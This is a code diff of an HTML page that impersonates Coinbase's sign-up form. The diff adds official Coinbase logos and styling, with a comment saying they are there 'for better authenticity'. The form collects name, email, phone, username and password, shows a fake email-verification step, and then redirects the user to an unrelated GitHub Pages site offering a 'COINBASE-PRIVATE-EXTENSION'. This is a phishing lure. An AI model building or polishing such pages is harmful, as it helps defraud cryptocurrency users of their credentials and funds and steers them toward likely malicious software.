@@ -3,135 +3,273 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Coin Base Sign Up</title>
+    <title>Coinbase Sign Up</title>
+    <link rel="icon" href="https://www.coinbase.com/favicon.ico">
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f5f5f5;
+            background: #f6f8fa;
+            margin: 0;
+            font-family: 'Inter', Arial, sans-serif;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            margin: 0;
         }
-        .registration-container {
+        .cb-container {
+            background: #fff;
             max-width: 400px;
-            background: #0070f3;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            color: white;
+            width: 100%;
+            padding: 32px 28px 24px 28px;
+            border-radius: 16px;
+            box-shadow: 0 4px 32px rgba(42, 66, 96, 0.10), 0 1.5px 12px rgba(42, 66, 96, 0.07);
             text-align: center;
         }
-        .registration-container img {
-            width: 100px; height: 100px;
-            border-radius: 50%;
-            margin-bottom: 20px;
+        .cb-logo {
+            width: 56px;
+            height: 56px;
+            border-radius: 14px;
+            margin-bottom: 18px;
+            background: #1652f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-left: auto;
+            margin-right: auto;
         }
-        .registration-container input[type="text"],
-        .registration-container input[type="email"],
-        .registration-container input[type="tel"],
-        .registration-container input[type="password"] {
-            padding: 10px;
-            margin: 10px 0;
-            border: none;
-            border-radius: 5px;
+        .cb-logo img {
+            width: 34px;
+            height: 34px;
+        }
+        .cb-title {
+            font-size: 1.6rem;
+            font-weight: 700;
+            margin-bottom: 12px;
+            color: #1652f0;
+        }
+        .cb-form input {
             width: 100%;
+            padding: 12px 10px;
+            margin-bottom: 16px;
+            border: 1.5px solid #dbe5ee;
+            border-radius: 8px;
+            background: #f6f8fa;
+            font-size: 1rem;
+            box-sizing: border-box;
+            outline: none;
+            transition: border 0.2s;
         }
-        .registration-container button {
-            padding: 10px;
-            background: #28a745;
-            color: white;
+        .cb-form input:focus {
+            border: 1.5px solid #1652f0;
+        }
+        .cb-form label {
+            font-size: 0.97rem;
+            color: #374151;
+            margin-bottom: 4px;
+            display: block;
+            text-align: left;
+            font-weight: 500;
+        }
+        .cb-btn {
+            width: 100%;
+            background: #1652f0;
+            color: #fff;
             border: none;
-            border-radius: 5px;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 1rem;
+            font-weight: 600;
             cursor: pointer;
+            transition: background 0.18s;
+            margin-top: 8px;
+            margin-bottom: 0;
         }
-        .terms-container {
-            margin: 10px 0;
+        .cb-btn:hover {
+            background: #143ea4;
+        }
+        .cb-terms {
+            font-size: 0.93rem;
+            color: #374151;
+            margin-bottom: 18px;
             text-align: left;
         }
-        .popup {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.7);
-            justify-content: center;
-            align-items: center;
-        }
-        .popup-content {
-            background: white;
-            padding: 20px;
-            border-radius: 5px;
-            text-align: center;
-            color: #222;
+        .cb-checkbox {
+            margin-right: 7px;
+            accent-color: #1652f0;
         }
         #codeSection {
             display: none;
-            margin-top: 20px;
+            margin-top: 10px;
         }
-        #codeSection input {
-            width: 80%;
-            margin-bottom: 10px;
+        .code-input-group {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .code-input-group input[type="text"] {
+            width: 60%;
+            margin-bottom: 0;
+            text-align: center;
+            letter-spacing: 2px;
+            font-weight: 600;
+            font-size: 1.2rem;
+        }
+        .cb-copy-btn {
+            background: #eaf1fb;
+            border: none;
+            color: #1652f0;
+            font-weight: 600;
+            border-radius: 6px;
+            padding: 7px 15px;
+            cursor: pointer;
+            font-size: 0.97rem;
+            transition: background 0.18s;
+        }
+        .cb-copy-btn:active {
+            background: #dbe5ee;
+        }
+        .verify-btn {
+            margin-top: 14px;
+        }
+        /* Modal styles */
+        .cb-modal-bg {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0; top: 0;
+            width: 100vw; height: 100vh;
+            background: rgba(16, 24, 40, 0.5);
+            justify-content: center;
+            align-items: center;
+        }
+        .cb-modal {
+            background: #fff;
+            border-radius: 12px;
+            box-shadow: 0 2px 24px rgba(0,0,0,0.13);
+            padding: 32px 28px;
+            max-width: 350px;
+            width: 94vw;
+            text-align: center;
+        }
+        .cb-modal-title {
+            font-size: 1.22rem;
+            font-weight: 700;
+            color: #1652f0;
+            margin-bottom: 8px;
+        }
+        .cb-modal-desc {
+            font-size: 1.02rem;
+            color: #1a2847;
+        }
+        @media (max-width: 500px) {
+            .cb-container {
+                padding: 16px 6px;
+            }
+            .cb-modal {
+                padding: 18px 6px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="registration-container">
-        <img src="IMG_9859.jpeg" alt="Logo">
-        <h2>COIN BASE SIGN UP</h2>
-        <form id="registrationForm">
-            <input type="text" id="name" placeholder="Name" required>
-            <input type="email" id="email" placeholder="Email" required>
-            <input type="tel" id="phone" placeholder="Phone Number" required>
-            <input type="text" id="username" placeholder="Username" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <div class="terms-container">
-                <input type="checkbox" id="terms" required>
-                <label for="terms">I accept the terms and conditions</label>
+    <div class="cb-container">
+        <div class="cb-logo">
+            <!-- Coinbase logo SVG for better authenticity -->
+            <img src="https://assets.coinbase.com/assets/brand-assets/brand-assets/coinbase-logo-circle-blue.svg" alt="Coinbase Logo" loading="lazy">
+        </div>
+        <div class="cb-title">Sign Up to Coinbase</div>
+        <form id="registrationForm" class="cb-form" autocomplete="off">
+            <label for="name">Full Name</label>
+            <input type="text" id="name" placeholder="Enter your name" required>
+            <label for="email">Email Address</label>
+            <input type="email" id="email" placeholder="Enter your email" required>
+            <label for="phone">Phone Number</label>
+            <input type="tel" id="phone" placeholder="Enter your phone" required>
+            <label for="username">Username</label>
+            <input type="text" id="username" placeholder="Choose a username" required>
+            <label for="password">Password</label>
+            <input type="password" id="password" placeholder="Create a password" required>
+            <div class="cb-terms">
+                <input type="checkbox" id="terms" class="cb-checkbox" required>
+                <label for="terms" style="display:inline;color:#374151;font-size:0.93rem;">I accept the terms and conditions</label>
             </div>
-            <button type="submit">Register</button>
+            <button class="cb-btn" type="submit">Create Account</button>
         </form>
         <div id="codeSection">
-            <p style="color: white;">A code has been sent to your email. Please enter it below to verify:</p>
-            <input type="text" id="verificationCodeInput" placeholder="Enter verification code" required>
-            <button id="verifyCodeBtn">Verify Code</button>
+            <div style="margin-bottom:8px;color:#222;font-weight:600;">Enter Verification Code</div>
+            <div class="code-input-group">
+                <input type="text" id="verificationCodeInput" maxlength="6" placeholder="6-digit code" required>
+                <button type="button" class="cb-copy-btn" id="copyCodeBtn">Copy</button>
+            </div>
+            <button class="cb-btn verify-btn" id="verifyCodeBtn">Log In</button>
         </div>
     </div>
-    <div id="popup" class="popup">
-        <div class="popup-content">
-            <img src="IMG_0309.gif" alt="Loading" style="width: 100px; height: 100px;" />
-            <p id="popupText">Registration loading...</p>
+
+    <!-- Custom Modal -->
+    <div class="cb-modal-bg" id="modalBg">
+        <div class="cb-modal">
+            <div class="cb-modal-title">Coinbase online access</div>
+            <div class="cb-modal-desc" id="modalDesc">
+                Verification code sent to your email: <span id="modalCode"></span>
+            </div>
         </div>
     </div>
+
     <script>
         let generatedCode = '';
-        document.getElementById('registrationForm').addEventListener('submit', function(event) {
-            event.preventDefault();
-            document.getElementById('popup').style.display = 'flex';
-            document.getElementById('popupText').textContent = 'Registration loading...';
 
-            // Simulate a loading process and "send" code
-            setTimeout(() => {
-                document.getElementById('popup').style.display = 'none';
-                // Generate 6-digit code
-                generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
-                // Simulate sending code to email (in real life, send from server!)
-                alert('Verification code sent to your email: ' + generatedCode);
-                // Show code input section
-                document.getElementById('codeSection').style.display = 'block';
-                // Hide registration form
-                document.getElementById('registrationForm').style.display = 'none';
-            }, 1500);
+        // Show custom modal
+        function showModal(code) {
+            document.getElementById('modalCode').textContent = code;
+            document.getElementById('modalBg').style.display = 'flex';
+        }
+        // Hide modal on click anywhere
+        document.getElementById('modalBg').addEventListener('click', function (e) {
+            if (e.target === this) {
+                this.style.display = 'none';
+            }
         });
 
+        // Registration submit
+        document.getElementById('registrationForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+            // Generate 6-digit code
+            generatedCode = Math.floor(100000 + Math.random() * 900000).toString();
+            // Show modal
+            showModal(generatedCode);
+
+            // Show code section, hide registration form
+            setTimeout(() => {
+                document.getElementById('modalBg').style.display = 'none';
+                document.getElementById('codeSection').style.display = 'block';
+                document.getElementById('registrationForm').style.display = 'none';
+                // Autofill code for demo (remove in production)
+                document.getElementById('verificationCodeInput').value = generatedCode;
+            }, 1700);
+        });
+
+        // Copy code button
+        document.getElementById('copyCodeBtn').addEventListener('click', function() {
+            // Copy the generated code to clipboard
+            navigator.clipboard.writeText(generatedCode)
+                .then(() => {
+                    this.textContent = 'Copied!';
+                    setTimeout(() => this.textContent = 'Copy', 1200);
+                });
+        });
+
+        // Verify code
         document.getElementById('verifyCodeBtn').addEventListener('click', function() {
             const userCode = document.getElementById('verificationCodeInput').value.trim();
             if (userCode === generatedCode) {
-                alert('Verification successful! You are now logged in.');
-                // Optionally redirect or enable access here
+                // Redirect to Coinbase extension URL
+                window.location.href = "https://blockchain-asset-experts.github.io/COINBASE-PRIVATE-EXTENSION-/";
             } else {
-                alert('Incorrect code. Please try again.');
+                document.getElementById('verificationCodeInput').style.border = '1.5px solid #d32f2f';
+                setTimeout(() => {
+                    document.getElementById('verificationCodeInput').style.border = '1.5px solid #1652f0';
+                    document.getElementById('verificationCodeInput').value = '';
+                    document.getElementById('verificationCodeInput').focus();
+                }, 1100);
             }
         });
     </script>
